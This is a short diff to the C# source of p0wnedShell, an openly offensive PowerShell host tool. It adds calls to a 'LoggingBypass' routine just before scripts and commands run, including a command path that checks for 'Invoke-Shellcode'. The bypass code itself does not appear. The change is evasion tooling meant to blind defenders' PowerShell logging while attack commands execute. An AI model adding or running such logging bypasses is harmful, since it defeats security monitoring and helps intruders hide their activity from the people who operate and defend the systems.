@@ -953,6 +953,8 @@ namespace p0wnedShell
             RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
             Pipeline pipeline = runspace.CreatePipeline();
 
+            p0wnedShellLoggingBypass.runBypass(runspace.GetType().Assembly);
+
             //Add commands
             if (cmd.IndexOf("Invoke-Shellcode", 0, StringComparison.OrdinalIgnoreCase) != -1)
             {
@@ -1004,6 +1006,9 @@ namespace p0wnedShell
         public static void RunPSFile(string script)
         {
             PowerShell ps = PowerShell.Create();
+
+            p0wnedShellLoggingBypass.runBypass(ps.Runspace.GetType().Assembly);
+
             ps.AddScript(script).Invoke();
         }
     }
